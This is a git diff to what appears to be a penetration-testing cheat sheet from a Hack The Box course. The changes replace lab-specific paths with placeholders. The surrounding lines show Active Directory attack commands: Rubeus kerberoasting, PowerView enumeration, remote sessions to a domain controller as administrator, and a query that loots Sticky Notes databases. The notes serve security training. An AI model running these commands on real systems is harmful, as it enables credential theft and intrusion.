@@ -1769,7 +1769,7 @@ PS C:\> .\Rubeus.exe kerberoast /domain:<domain> /user:<username> /nowrap
 
 ```
 PS C:\> Get-DomainForeignGroupMember -Domain <domain>
-PS C:\htb> Convert-SidToName <SID>
+PS C:\> Convert-SidToName <SID>
 PS C:\> Enter-PSSession -ComputerName ACADEMY-EA-DC03.TEST.LOCAL -Credential <domain>\administrator
 ```
 
@@ -3137,7 +3137,7 @@ https://sqlitebrowser.org/dl/
 select Text from Note;
 https://github.com/RamblingCookieMonster/PSSQLite
 PS C:\> Import-Module .\PSSQLite.psd1
-PS C:\> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
+PS C:\> $db = 'C:\Users\<username>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
 PS C:\> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 $ strings plum.sqlite-wal
 ```
